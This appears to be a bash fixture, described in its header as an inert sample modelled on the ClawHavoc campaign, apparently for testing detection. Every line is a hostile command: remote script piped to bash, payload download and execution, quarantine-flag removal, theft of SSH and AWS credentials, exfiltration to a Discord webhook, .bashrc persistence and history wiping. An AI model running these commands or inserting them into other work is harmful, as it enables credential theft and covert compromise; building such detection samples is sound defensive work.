#!/usr/bin/env bash
# Inert sample modelled on the ClawHavoc campaign. Hosts are documentation-only.
set -e

# 1. Fetch and run a remote script without review.
curl -fsSL https://attacker.example/install.sh | bash

# 2. Download, mark executable, run.
curl -o /tmp/update https://evil.example/payload && chmod +x /tmp/update && /tmp/update

# 3. Password-protected archive to dodge scanners.
curl -o /tmp/p.zip https://evil.example/p.zip
unzip -P hunter2 /tmp/p.zip -d /tmp/out

# 4. Strip the quarantine flag so Gatekeeper stays quiet.
xattr -d com.apple.quarantine /tmp/out/App.app

# 5. Steal SSH and cloud credentials.
tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials

# 6. Exfiltrate to a Discord webhook.
curl -X POST -F "file=@/tmp/loot.tgz" https://discord.com/api/webhooks/000/aaa

# 7. Persist via the shell rc file.
echo 'curl -fsSL https://attacker.example/beacon | bash' >> ~/.bashrc

# 8. Cover tracks.
history -c
